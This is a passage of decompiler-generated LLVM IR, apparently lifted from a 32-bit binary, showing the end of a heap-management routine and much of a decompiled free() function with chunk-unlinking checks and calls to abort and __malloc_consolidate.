  %v15_80508af = icmp eq i32 %v3_80508af, %v3_80508a8
  %v1_80508b2 = icmp eq i1 %v15_80508af, false
  br i1 %v1_80508b2, label %dec_label_pc_80508ec, label %dec_label_pc_80508b4

dec_label_pc_80508b4:                             ; preds = %dec_label_pc_80508af
  %v2_80508b4 = add i32 %v2_805089c, %v1_805088b
  store i32 %v2_80508b4, i32* @edi, align 4
  store i32 %v3_80508a5, i32* %v2_80508a8, align 4
  %v0_80508b9 = load i32, i32* @esi, align 4
  %v1_80508b9 = load i32, i32* %edx.global-to-local, align 4
  %v2_80508b9 = add i32 %v1_80508b9, 8
  %v3_80508b9 = inttoptr i32 %v2_80508b9 to i32*
  store i32 %v0_80508b9, i32* %v3_80508b9, align 4
  %v0_80508c7.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80508bc

dec_label_pc_80508bc:                             ; preds = %dec_label_pc_805087f, %dec_label_pc_80508b4
  %v1_80508d0 = phi i32 [ %v2_8050890, %dec_label_pc_805087f ], [ %v0_80508c7.pre, %dec_label_pc_80508b4 ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_80508c4 = and i32 %v3_8050893, -4
  store i32 %v1_80508c4, i32* %ebp.global-to-local, align 4
  %v4_80508c7 = load i32, i32* %v3_805092a, align 4
  %v15_80508c7 = icmp eq i32 %v1_80508d0, %v4_80508c7
  br i1 %v15_80508c7, label %dec_label_pc_805091d, label %dec_label_pc_80508cc

dec_label_pc_80508cc:                             ; preds = %dec_label_pc_80508bc
  %v2_80508cc = add i32 %v1_80508d0, 4
  %v3_80508cc = add i32 %v2_80508cc, %v1_80508c4
  %v4_80508cc = inttoptr i32 %v3_80508cc to i32*
  %v5_80508cc = load i32, i32* %v4_80508cc, align 4
  store i32 %v5_80508cc, i32* %eax.global-to-local, align 4
  %v3_80508d0 = inttoptr i32 %v2_80508cc to i32*
  store i32 %v1_80508c4, i32* %v3_80508d0, align 4
  %v0_80508d3 = load i32, i32* %eax.global-to-local, align 4
  %v1_80508d3 = urem i32 %v0_80508d3, 2
  %v2_80508d3 = icmp eq i32 %v1_80508d3, 0
  store i32 %v1_80508d3, i32* %eax.global-to-local, align 4
  %v1_80508d8 = icmp eq i1 %v2_80508d3, false
  br i1 %v1_80508d8, label %dec_label_pc_80508f9, label %dec_label_pc_80508da

dec_label_pc_80508da:                             ; preds = %dec_label_pc_80508cc
  %v0_80508da = load i32, i32* @ebx, align 4
  %v1_80508da = add i32 %v0_80508da, 8
  %v2_80508da = inttoptr i32 %v1_80508da to i32*
  %v3_80508da = load i32, i32* %v2_80508da, align 4
  store i32 %v3_80508da, i32* @edx, align 4
  %v1_80508dd = add i32 %v0_80508da, 12
  %v2_80508dd = inttoptr i32 %v1_80508dd to i32*
  %v3_80508dd = load i32, i32* %v2_80508dd, align 4
  store i32 %v3_80508dd, i32* %eax.global-to-local, align 4
  %v1_80508e0 = add i32 %v3_80508da, 12
  %v2_80508e0 = inttoptr i32 %v1_80508e0 to i32*
  %v3_80508e0 = load i32, i32* %v2_80508e0, align 4
  store i32 %v3_80508e0, i32* @esi, align 4
  %v12_80508e3 = icmp eq i32 %v3_80508e0, %v0_80508da
  %v1_80508e5 = icmp eq i1 %v12_80508e3, false
  br i1 %v1_80508e5, label %dec_label_pc_80508ec, label %dec_label_pc_80508e7

dec_label_pc_80508e7:                             ; preds = %dec_label_pc_80508da
  %v1_80508e7 = add i32 %v3_80508dd, 8
  %v2_80508e7 = inttoptr i32 %v1_80508e7 to i32*
  %v3_80508e7 = load i32, i32* %v2_80508e7, align 4
  %v15_80508e7 = icmp eq i32 %v3_80508e7, %v3_80508e0
  br i1 %v15_80508e7, label %dec_label_pc_80508f1, label %dec_label_pc_80508ec

dec_label_pc_80508ec:                             ; preds = %dec_label_pc_80508e7, %dec_label_pc_80508da, %dec_label_pc_80508af, %dec_label_pc_805089c
  %v0_80508ec = call i32 @abort()
  store i32 %v0_80508ec, i32* %eax.global-to-local, align 4
  %v1_80508f3.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80508f1

dec_label_pc_80508f1:                             ; preds = %dec_label_pc_80508e7, %dec_label_pc_80508ec
  %v1_80508f3 = phi i32 [ %v3_80508da, %dec_label_pc_80508e7 ], [ %v1_80508f3.pre, %dec_label_pc_80508ec ]
  %v0_80508f3 = phi i32 [ %v3_80508dd, %dec_label_pc_80508e7 ], [ %v0_80508ec, %dec_label_pc_80508ec ]
  %v0_80508f1 = load i32, i32* @edi, align 4
  %v1_80508f1 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80508f1 = add i32 %v1_80508f1, %v0_80508f1
  store i32 %v2_80508f1, i32* @edi, align 4
  %v2_80508f3 = add i32 %v1_80508f3, 12
  %v3_80508f3 = inttoptr i32 %v2_80508f3 to i32*
  store i32 %v0_80508f3, i32* %v3_80508f3, align 4
  %v0_80508f6 = load i32, i32* @edx, align 4
  %v1_80508f6 = load i32, i32* %eax.global-to-local, align 4
  %v2_80508f6 = add i32 %v1_80508f6, 8
  %v3_80508f6 = inttoptr i32 %v2_80508f6 to i32*
  store i32 %v0_80508f6, i32* %v3_80508f6, align 4
  br label %dec_label_pc_80508f9

dec_label_pc_80508f9:                             ; preds = %dec_label_pc_80508cc, %dec_label_pc_80508f1
  store i32 %v1_8050844, i32* %eax.global-to-local, align 4
  %v3_80508fd = load i32, i32* %v2_80508fd, align 4
  store i32 %v3_80508fd, i32* @edx, align 4
  %v0_8050900 = load i32, i32* @ecx, align 4
  store i32 %v0_8050900, i32* %v2_80508fd, align 4
  %v0_8050903 = load i32, i32* @edi, align 4
  %v1_8050905 = or i32 %v0_8050903, 1
  store i32 %v1_8050905, i32* %eax.global-to-local, align 4
  %v0_8050908 = load i32, i32* @ecx, align 4
  %v1_8050908 = load i32, i32* @edx, align 4
  %v2_8050908 = add i32 %v1_8050908, 12
  %v3_8050908 = inttoptr i32 %v2_8050908 to i32*
  store i32 %v0_8050908, i32* %v3_8050908, align 4
  %v0_805090b = load i32, i32* %eax.global-to-local, align 4
  %v1_805090b = load i32, i32* @ecx, align 4
  %v2_805090b = add i32 %v1_805090b, 4
  %v3_805090b = inttoptr i32 %v2_805090b to i32*
  store i32 %v0_805090b, i32* %v3_805090b, align 4
  store i32 %v1_8050844, i32* %eax.global-to-local, align 4
  %v0_8050912 = load i32, i32* @edx, align 4
  %v1_8050912 = load i32, i32* @ecx, align 4
  %v2_8050912 = add i32 %v1_8050912, 8
  %v3_8050912 = inttoptr i32 %v2_8050912 to i32*
  store i32 %v0_8050912, i32* %v3_8050912, align 4
  %v0_8050915 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050915 = load i32, i32* @ecx, align 4
  %v2_8050915 = add i32 %v1_8050915, 12
  %v3_8050915 = inttoptr i32 %v2_8050915 to i32*
  store i32 %v0_8050915, i32* %v3_8050915, align 4
  %v0_8050918 = load i32, i32* @edi, align 4
  %v1_8050918 = load i32, i32* @ecx, align 4
  %v3_8050918 = add i32 %v1_8050918, %v0_8050918
  %v4_8050918 = inttoptr i32 %v3_8050918 to i32*
  store i32 %v0_8050918, i32* %v4_8050918, align 4
  br label %dec_label_pc_805092d

dec_label_pc_805091d:                             ; preds = %dec_label_pc_80508bc
  %v0_805091d = load i32, i32* @edi, align 4
  %v2_805091d = add i32 %v0_805091d, %v1_80508c4
  %v1_8050920 = or i32 %v2_805091d, 1
  store i32 %v1_8050920, i32* %eax.global-to-local, align 4
  %v1_8050923 = load i32, i32* @ecx, align 4
  %v2_8050923 = add i32 %v1_8050923, 4
  %v3_8050923 = inttoptr i32 %v2_8050923 to i32*
  store i32 %v1_8050920, i32* %v3_8050923, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_805092a = load i32, i32* @ecx, align 4
  store i32 %v0_805092a, i32* %v3_805092a, align 4
  br label %dec_label_pc_805092d

dec_label_pc_805092d:                             ; preds = %dec_label_pc_80508f9, %dec_label_pc_805091d
  store i32 %v3_805087f, i32* @ecx, align 4
  %v1_8050931 = icmp eq i32 %v3_805087f, 0
  %v1_8050933 = icmp eq i1 %v1_8050931, false
  br i1 %v1_8050933, label %dec_label_pc_805087f, label %dec_label_pc_8050939

dec_label_pc_8050939:                             ; preds = %dec_label_pc_805092d, %dec_label_pc_805086b
  store i32 %v4_8050863, i32* @ecx, align 4
  %v15_805093d = icmp eq i32 %v0_8050879, %v4_8050863
  br i1 %v15_805093d, label %dec_label_pc_80509c1, label %dec_label_pc_8050943

dec_label_pc_8050943:                             ; preds = %dec_label_pc_8050939
  %v4_8050943 = add i32 %v0_8050879, 4
  br label %dec_label_pc_805086b

dec_label_pc_805094d:                             ; preds = %dec_label_pc_805095c.preheader, %dec_label_pc_805094d
  %v1_805095120 = phi i32 [ 1, %dec_label_pc_805095c.preheader ], [ %v0_805095c.pre, %dec_label_pc_805094d ]
  %v2_8050951 = mul i32 %v1_805095120, 8
  %v4_8050951 = add i32 %v3_8050951, %v2_8050951
  store i32 %v4_8050951, i32* %eax.global-to-local, align 4
  %v1_8050955 = add i32 %v1_805095120, 1
  store i32 %v1_8050955, i32* %edx.global-to-local, align 4
  %v2_8050956 = add i32 %v4_8050951, 12
  %v3_8050956 = inttoptr i32 %v2_8050956 to i32*
  store i32 %v4_8050951, i32* %v3_8050956, align 4
  %v0_8050959 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050959 = add i32 %v0_8050959, 8
  %v3_8050959 = inttoptr i32 %v2_8050959 to i32*
  store i32 %v0_8050959, i32* %v3_8050959, align 4
  %v0_805095c.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_805095f = icmp sgt i32 %v0_805095c.pre, 95
  br i1 %v7_805095f, label %dec_label_pc_8050961, label %dec_label_pc_805094d

dec_label_pc_8050961:                             ; preds = %dec_label_pc_805094d
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8050965 = add i32 %tmp11, 864
  %v2_8050965 = inttoptr i32 %v1_8050965 to i32*
  %v3_8050965 = load i32, i32* %v2_8050965, align 4
  %v4_8050965 = or i32 %v3_8050965, 1
  store i32 %v4_8050965, i32* %v2_8050965, align 4
  %v0_805096c = load i32, i32* %eax.global-to-local, align 4
  %v1_805096c = add i32 %v0_805096c, 840
  %v2_805096c = inttoptr i32 %v1_805096c to i32*
  store i32 0, i32* %v2_805096c, align 4
  %v0_8050976 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050976 = add i32 %v0_8050976, 852
  %v2_8050976 = inttoptr i32 %v1_8050976 to i32*
  store i32 65536, i32* %v2_8050976, align 4
  %v0_8050980 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050980 = add i32 %v0_8050980, 844
  %v2_8050980 = inttoptr i32 %v1_8050980 to i32*
  store i32 262144, i32* %v2_8050980, align 4
  %v0_805098a = load i32, i32* %eax.global-to-local, align 4
  %v1_805098a = add i32 %v0_805098a, 836
  %v2_805098a = inttoptr i32 %v1_805098a to i32*
  store i32 262144, i32* %v2_805098a, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_805099b = load i32, i32* %arg1, align 4
  %v1_805099d = urem i32 %v2_805099b, 4
  %v1_80509a0 = or i32 %v1_805099d, 72
  store i32 %v1_80509a0, i32* %arg1, align 4
  %v0_80509a5 = load i32, i32* @edx, align 4
  %v1_80509a7 = add i32 %v0_80509a5, 52
  store i32 %v1_80509a7, i32* %eax.global-to-local, align 4
  %v2_80509aa = add i32 %v0_80509a5, 44
  %v3_80509aa = inttoptr i32 %v2_80509aa to i32*
  store i32 %v1_80509a7, i32* %v3_80509aa, align 4
  %v1_80509af = call i32 @sysconf(i32 30)
  store i32 %v1_80509af, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_80509bb = add i32 %tmp11, 860
  %v3_80509bb = inttoptr i32 %v2_80509bb to i32*
  store i32 %v1_80509af, i32* %v3_80509bb, align 4
  br label %dec_label_pc_80509c1

dec_label_pc_80509c1:                             ; preds = %dec_label_pc_8050939, %dec_label_pc_8050961
  store i32 %v0_8050824, i32* @ebx, align 4
  store i32 %v0_8050823, i32* @esi, align 4
  store i32 %v0_8050822, i32* @edi, align 4
  %v0_80509c8 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80509c8

; uselistorder directives
  uselistorder i32 %v0_8050959, { 1, 0 }
  uselistorder i32 %v0_8050918, { 1, 0 }
  uselistorder i32 %v1_80508d3, { 1, 0 }
  uselistorder i32 %v2_80508cc, { 1, 0 }
  uselistorder i32 %v1_80508c4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80508d0, { 1, 0 }
  uselistorder i32 %v3_805087f, { 2, 1, 3, 0 }
  uselistorder i32 %v0_805089c, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8050879, { 1, 0, 3, 2 }
  uselistorder i32* %v3_805092a, { 1, 0 }
  uselistorder i32 %v1_8050844, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_80509c1, { 1, 0 }
  uselistorder label %dec_label_pc_805094d, { 1, 0 }
  uselistorder label %dec_label_pc_805092d, { 1, 0 }
  uselistorder label %dec_label_pc_80508f9, { 1, 0 }
  uselistorder label %dec_label_pc_80508f1, { 1, 0 }
  uselistorder label %dec_label_pc_80508bc, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80509c9 = load i32, i32* @ebp, align 4
  %v0_80509ca = load i32, i32* @edi, align 4
  %v0_80509cb = load i32, i32* @esi, align 4
  %v0_80509cc = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_80509d4 = icmp eq i32 %arg1, 0
  br i1 %v1_80509d4, label %dec_label_pc_8050b5d, label %dec_label_pc_80509dc

dec_label_pc_80509dc:                             ; preds = %entry
  %v2_80509e7 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80509e7, i32* @eax, align 4
  %v2_80509ec = call i32 @__pthread_return_void(i32 %v2_80509e7, i32 134550911)
  store i32 %v2_80509ec, i32* %eax.global-to-local, align 4
  %v1_80509f8 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a010.224 to i32))
  %v1_80509fd = add i32 %arg1, -8
  store i32 %v1_80509fd, i32* @ecx, align 4
  %v0_8050a00 = load i8, i8* @global_var_8060480.225, align 1
  %v1_8050a00 = sext i8 %v0_8050a00 to i32
  store i32 %v1_8050a00, i32* %eax.global-to-local, align 4
  %v1_8050a08 = add i32 %arg1, -4
  %v2_8050a08 = inttoptr i32 %v1_8050a08 to i32*
  %v3_8050a08 = load i32, i32* %v2_8050a08, align 4
  %v1_8050a0d = and i32 %v3_8050a08, -4
  %v4_8050a0d = trunc i32 %v1_8050a0d to i8
  store i32 %v1_8050a0d, i32* @ebx, align 4
  %v8_8050a12 = icmp ugt i8 %v4_8050a0d, %v0_8050a00
  br i1 %v8_8050a12, label %dec_label_pc_8050a34, label %dec_label_pc_8050a14

dec_label_pc_8050a14:                             ; preds = %dec_label_pc_80509dc
  %v2_8050a14 = udiv i32 %v3_8050a08, 8
  %v1_8050a17 = or i32 %v1_8050a00, 3
  %v3_8050a17 = trunc i32 %v1_8050a17 to i8
  store i32 %v1_8050a17, i32* %eax.global-to-local, align 4
  store i8 %v3_8050a17, i8* @global_var_8060480.225, align 128
  %v1_8050a1f = mul nuw i32 %v2_8050a14, 4
  %v2_8050a1f = add i32 %v1_8050a1f, ptrtoint (i8* @global_var_8060480.225 to i32)
  store i32 %v2_8050a1f, i32* @edx, align 4
  %v1_8050a26 = add i32 %v1_8050a1f, add (i32 ptrtoint (i8* @global_var_8060480.225 to i32), i32 -4)
  %v2_8050a26 = inttoptr i32 %v1_8050a26 to i32*
  %v3_8050a26 = load i32, i32* %v2_8050a26, align 4
  store i32 %v3_8050a26, i32* %eax.global-to-local, align 4
  %v3_8050a29 = inttoptr i32 %arg1 to i32*
  store i32 %v3_8050a26, i32* %v3_8050a29, align 4
  %v0_8050a2c = load i32, i32* @ecx, align 4
  %v1_8050a2c = load i32, i32* @edx, align 4
  %v2_8050a2c = add i32 %v1_8050a2c, -4
  %v3_8050a2c = inttoptr i32 %v2_8050a2c to i32*
  store i32 %v0_8050a2c, i32* %v3_8050a2c, align 4
  br label %dec_label_pc_8050b4c

dec_label_pc_8050a34:                             ; preds = %dec_label_pc_80509dc
  %v1_8050a34 = trunc i32 %v3_8050a08 to i8
  %v2_8050a34 = and i8 %v1_8050a34, 2
  %v3_8050a34 = icmp eq i8 %v2_8050a34, 0
  %v5_8050a34 = zext i8 %v2_8050a34 to i32
  %v7_8050a34 = and i32 %v3_8050a08, -256
  %v8_8050a34 = or i32 %v5_8050a34, %v7_8050a34
  store i32 %v8_8050a34, i32* @edx, align 4
  %v1_8050a37 = icmp eq i1 %v3_8050a34, false
  br i1 %v1_8050a37, label %dec_label_pc_8050b2c, label %dec_label_pc_8050a3d

dec_label_pc_8050a3d:                             ; preds = %dec_label_pc_8050a34
  %v1_8050a3d = or i32 %v1_8050a00, 1
  %v3_8050a3d = trunc i32 %v1_8050a3d to i8
  store i32 %v1_8050a3d, i32* %eax.global-to-local, align 4
  %v2_8050a40 = add i32 %v1_8050a0d, %v1_80509fd
  store i32 %v2_8050a40, i32* @esi, align 4
  store i8 %v3_8050a3d, i8* @global_var_8060480.225, align 128
  %v1_8050a48 = add i32 %v2_8050a40, 4
  %v2_8050a48 = inttoptr i32 %v1_8050a48 to i32*
  %v3_8050a48 = load i32, i32* %v2_8050a48, align 4
  store i32 %v3_8050a48, i32* %eax.global-to-local, align 4
  %v2_8050a4f = inttoptr i32 %v1_8050a08 to i8*
  %v3_8050a4f = load i8, i8* %v2_8050a4f, align 1
  %v4_8050a4f = urem i8 %v3_8050a4f, 2
  %v5_8050a4f = icmp eq i8 %v4_8050a4f, 0
  %v1_8050a53 = icmp eq i1 %v5_8050a4f, false
  br i1 %v1_8050a53, label %dec_label_pc_8050a76, label %dec_label_pc_8050a55

dec_label_pc_8050a55:                             ; preds = %dec_label_pc_8050a3d
  %v2_8050a55 = inttoptr i32 %v1_80509fd to i32*
  %v3_8050a55 = load i32, i32* %v2_8050a55, align 4
  store i32 %v3_8050a55, i32* @ebp, align 4
  %v2_8050a5a = sub i32 %v1_80509fd, %v3_8050a55
  store i32 %v2_8050a5a, i32* %eax.global-to-local, align 4
  %v1_8050a5c = add i32 %v2_8050a5a, 8
  %v2_8050a5c = inttoptr i32 %v1_8050a5c to i32*
  %v3_8050a5c = load i32, i32* %v2_8050a5c, align 4
  store i32 %v3_8050a5c, i32* @edi, align 4
  %v1_8050a5f = add i32 %v2_8050a5a, 12
  %v2_8050a5f = inttoptr i32 %v1_8050a5f to i32*
  %v3_8050a5f = load i32, i32* %v2_8050a5f, align 4
  store i32 %v3_8050a5f, i32* @edx, align 4
  %v1_8050a62 = add i32 %v3_8050a5c, 12
  %v2_8050a62 = inttoptr i32 %v1_8050a62 to i32*
  %v3_8050a62 = load i32, i32* %v2_8050a62, align 4
  store i32 %v3_8050a62, i32* @ecx, align 4
  %v12_8050a65 = icmp eq i32 %v3_8050a62, %v2_8050a5a
  %v1_8050a67 = icmp eq i1 %v12_8050a65, false
  br i1 %v1_8050a67, label %dec_label_pc_8050aa5, label %dec_label_pc_8050a69

dec_label_pc_8050a69:                             ; preds = %dec_label_pc_8050a55
  %v1_8050a69 = add i32 %v3_8050a5f, 8
  %v2_8050a69 = inttoptr i32 %v1_8050a69 to i32*
  %v3_8050a69 = load i32, i32* %v2_8050a69, align 4
  %v15_8050a69 = icmp eq i32 %v3_8050a69, %v3_8050a62
  %v1_8050a6c = icmp eq i1 %v15_8050a69, false
  br i1 %v1_8050a6c, label %dec_label_pc_8050aa5, label %dec_label_pc_8050a6e

dec_label_pc_8050a6e:                             ; preds = %dec_label_pc_8050a69
  %v2_8050a6e = add i32 %v3_8050a55, %v1_8050a0d
  store i32 %v2_8050a6e, i32* @ebx, align 4
  store i32 %v3_8050a5f, i32* %v2_8050a62, align 4
  %v0_8050a73 = load i32, i32* @edi, align 4
  %v1_8050a73 = load i32, i32* @edx, align 4
  %v2_8050a73 = add i32 %v1_8050a73, 8
  %v3_8050a73 = inttoptr i32 %v2_8050a73 to i32*
  store i32 %v0_8050a73, i32* %v3_8050a73, align 4
  %v0_8050a7d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050a76

dec_label_pc_8050a76:                             ; preds = %dec_label_pc_8050a3d, %dec_label_pc_8050a6e
  %v1_8050a89 = phi i32 [ %v2_8050a40, %dec_label_pc_8050a3d ], [ %v0_8050a7d.pre, %dec_label_pc_8050a6e ]
  %v1_8050a7a = and i32 %v3_8050a48, -4
  store i32 %v1_8050a7a, i32* @ebp, align 4
  %v1_8050a7d = load i32, i32* @global_var_80604ac.226, align 4
  %v12_8050a7d = icmp eq i32 %v1_8050a89, %v1_8050a7d
  br i1 %v12_8050a7d, label %dec_label_pc_8050ad7, label %dec_label_pc_8050a85

dec_label_pc_8050a85:                             ; preds = %dec_label_pc_8050a76
  %v2_8050a85 = add i32 %v1_8050a89, 4
  %v3_8050a85 = add i32 %v2_8050a85, %v1_8050a7a
  %v4_8050a85 = inttoptr i32 %v3_8050a85 to i32*
  %v5_8050a85 = load i32, i32* %v4_8050a85, align 4
  store i32 %v5_8050a85, i32* %eax.global-to-local, align 4
  %v3_8050a89 = inttoptr i32 %v2_8050a85 to i32*
  store i32 %v1_8050a7a, i32* %v3_8050a89, align 4
  %v0_8050a8c = load i32, i32* %eax.global-to-local, align 4
  %v1_8050a8c = urem i32 %v0_8050a8c, 2
  %v2_8050a8c = icmp eq i32 %v1_8050a8c, 0
  store i32 %v1_8050a8c, i32* %eax.global-to-local, align 4
  %v1_8050a91 = icmp eq i1 %v2_8050a8c, false
  br i1 %v1_8050a91, label %dec_label_pc_8050ab2, label %dec_label_pc_8050a93

dec_label_pc_8050a93:                             ; preds = %dec_label_pc_8050a85
  %v0_8050a93 = load i32, i32* @esi, align 4
  %v1_8050a93 = add i32 %v0_8050a93, 8
  %v2_8050a93 = inttoptr i32 %v1_8050a93 to i32*
  %v3_8050a93 = load i32, i32* %v2_8050a93, align 4
  store i32 %v3_8050a93, i32* @edx, align 4
  %v1_8050a96 = add i32 %v0_8050a93, 12
  %v2_8050a96 = inttoptr i32 %v1_8050a96 to i32*
  %v3_8050a96 = load i32, i32* %v2_8050a96, align 4
  store i32 %v3_8050a96, i32* %eax.global-to-local, align 4
  %v1_8050a99 = add i32 %v3_8050a93, 12
  %v2_8050a99 = inttoptr i32 %v1_8050a99 to i32*
  %v3_8050a99 = load i32, i32* %v2_8050a99, align 4
  store i32 %v3_8050a99, i32* @edi, align 4
  %v12_8050a9c = icmp eq i32 %v3_8050a99, %v0_8050a93
  %v1_8050a9e = icmp eq i1 %v12_8050a9c, false
  br i1 %v1_8050a9e, label %dec_label_pc_8050aa5, label %dec_label_pc_8050aa0

dec_label_pc_8050aa0:                             ; preds = %dec_label_pc_8050a93
  %v1_8050aa0 = add i32 %v3_8050a96, 8
  %v2_8050aa0 = inttoptr i32 %v1_8050aa0 to i32*
  %v3_8050aa0 = load i32, i32* %v2_8050aa0, align 4
  %v15_8050aa0 = icmp eq i32 %v3_8050aa0, %v3_8050a99
  br i1 %v15_8050aa0, label %dec_label_pc_8050aaa, label %dec_label_pc_8050aa5

dec_label_pc_8050aa5:                             ; preds = %dec_label_pc_8050aa0, %dec_label_pc_8050a93, %dec_label_pc_8050a69, %dec_label_pc_8050a55
  %v0_8050aa5 = call i32 @abort()
  store i32 %v0_8050aa5, i32* %eax.global-to-local, align 4
  %v1_8050aaa.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050aaa

dec_label_pc_8050aaa:                             ; preds = %dec_label_pc_8050aa0, %dec_label_pc_8050aa5
  %v1_8050aaa = phi i32 [ %v3_8050a93, %dec_label_pc_8050aa0 ], [ %v1_8050aaa.pre, %dec_label_pc_8050aa5 ]
  %v0_8050aaa = phi i32 [ %v3_8050a96, %dec_label_pc_8050aa0 ], [ %v0_8050aa5, %dec_label_pc_8050aa5 ]
  %v2_8050aaa = add i32 %v1_8050aaa, 12
  %v3_8050aaa = inttoptr i32 %v2_8050aaa to i32*
  store i32 %v0_8050aaa, i32* %v3_8050aaa, align 4
  %v0_8050aad = load i32, i32* @edx, align 4
  %v1_8050aad = load i32, i32* %eax.global-to-local, align 4
  %v2_8050aad = add i32 %v1_8050aad, 8
  %v3_8050aad = inttoptr i32 %v2_8050aad to i32*
  store i32 %v0_8050aad, i32* %v3_8050aad, align 4
  %v0_8050ab0 = load i32, i32* @ebx, align 4
  %v1_8050ab0 = load i32, i32* @ebp, align 4
  %v2_8050ab0 = add i32 %v1_8050ab0, %v0_8050ab0
  store i32 %v2_8050ab0, i32* @ebx, align 4
  br label %dec_label_pc_8050ab2

dec_label_pc_8050ab2:                             ; preds = %dec_label_pc_8050a85, %dec_label_pc_8050aaa
  %v0_8050ab2 = load i32, i32* @global_var_80604bc.244, align 4
  store i32 %v0_8050ab2, i32* %eax.global-to-local, align 4
  %v0_8050ab7 = load i32, i32* @ecx, align 4
  %v1_8050ab7 = add i32 %v0_8050ab7, 12
  %v2_8050ab7 = inttoptr i32 %v1_8050ab7 to i32*
  store i32 ptrtoint (i32* @global_var_80604b4.228 to i32), i32* %v2_8050ab7, align 4
  %v0_8050abe = load i32, i32* %eax.global-to-local, align 4
  %v1_8050abe = load i32, i32* @ecx, align 4
  %v2_8050abe = add i32 %v1_8050abe, 8
  %v3_8050abe = inttoptr i32 %v2_8050abe to i32*
  store i32 %v0_8050abe, i32* %v3_8050abe, align 4
  %v0_8050ac1 = load i32, i32* @ebx, align 4
  %v1_8050ac1 = load i32, i32* @ecx, align 4
  %v3_8050ac1 = add i32 %v1_8050ac1, %v0_8050ac1
  %v4_8050ac1 = inttoptr i32 %v3_8050ac1 to i32*
  store i32 %v0_8050ac1, i32* %v4_8050ac1, align 4
  %v0_8050ac4 = load i32, i32* @ecx, align 4
  %v1_8050ac4 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050ac4 = add i32 %v1_8050ac4, 12
  %v3_8050ac4 = inttoptr i32 %v2_8050ac4 to i32*
  store i32 %v0_8050ac4, i32* %v3_8050ac4, align 4
  %v0_8050ac7 = load i32, i32* @ebx, align 4
  %v1_8050ac9 = or i32 %v0_8050ac7, 1
  store i32 %v1_8050ac9, i32* %eax.global-to-local, align 4
  %v0_8050acc = load i32, i32* @ecx, align 4
  store i32 %v0_8050acc, i32* @global_var_80604bc.244, align 4
  %v2_8050ad2 = add i32 %v0_8050acc, 4
  %v3_8050ad2 = inttoptr i32 %v2_8050ad2 to i32*
  store i32 %v1_8050ac9, i32* %v3_8050ad2, align 4
  br label %dec_label_pc_8050ae7

dec_label_pc_8050ad7:                             ; preds = %dec_label_pc_8050a76
  %v0_8050ad7 = load i32, i32* @ebx, align 4
  %v2_8050ad7 = add i32 %v0_8050ad7, %v1_8050a7a
  store i32 %v2_8050ad7, i32* @ebx, align 4
  %v1_8050adb = or i32 %v2_8050ad7, 1
  store i32 %v1_8050adb, i32* %eax.global-to-local, align 4
  %v1_8050ade = load i32, i32* @ecx, align 4
  %v2_8050ade = add i32 %v1_8050ade, 4
  %v3_8050ade = inttoptr i32 %v2_8050ade to i32*
  store i32 %v1_8050adb, i32* %v3_8050ade, align 4
  %v0_8050ae1 = load i32, i32* @ecx, align 4
  store i32 %v0_8050ae1, i32* @global_var_80604ac.226, align 4
  br label %dec_label_pc_8050ae7

dec_label_pc_8050ae7:                             ; preds = %dec_label_pc_8050ab2, %dec_label_pc_8050ad7
  %v0_8050ae7 = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_8050ae7, 131072
  br i1 %tmp21, label %dec_label_pc_8050b4c, label %dec_label_pc_8050aef

dec_label_pc_8050aef:                             ; preds = %dec_label_pc_8050ae7
  %v0_8050aef = load i8, i8* @global_var_8060480.225, align 128
  %v1_8050aef = and i8 %v0_8050aef, 2
  %v2_8050aef = icmp eq i8 %v1_8050aef, 0
  br i1 %v2_8050aef, label %dec_label_pc_8050b08, label %dec_label_pc_8050af8

dec_label_pc_8050af8:                             ; preds = %dec_label_pc_8050aef
  %v2_8050b00 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8060480.225 to i32*))
  store i32 %v2_8050b00, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050b08

dec_label_pc_8050b08:                             ; preds = %dec_label_pc_8050aef, %dec_label_pc_8050af8
  %v0_8050b08 = load i32, i32* @global_var_80604ac.226, align 4
  store i32 %v0_8050b08, i32* %eax.global-to-local, align 4
  %v1_8050b0d = add i32 %v0_8050b08, 4
  %v2_8050b0d = inttoptr i32 %v1_8050b0d to i32*
  %v3_8050b0d = load i32, i32* %v2_8050b0d, align 4
  %v1_8050b10 = and i32 %v3_8050b0d, -4
  store i32 %v1_8050b10, i32* %eax.global-to-local, align 4
  %v1_8050b13 = load i32, i32* @global_var_80607c4.242, align 4
  %v7_8050b13 = icmp ult i32 %v1_8050b10, %v1_8050b13
  br i1 %v7_8050b13, label %dec_label_pc_8050b4c, label %dec_label_pc_8050b1b

dec_label_pc_8050b1b:                             ; preds = %dec_label_pc_8050b08
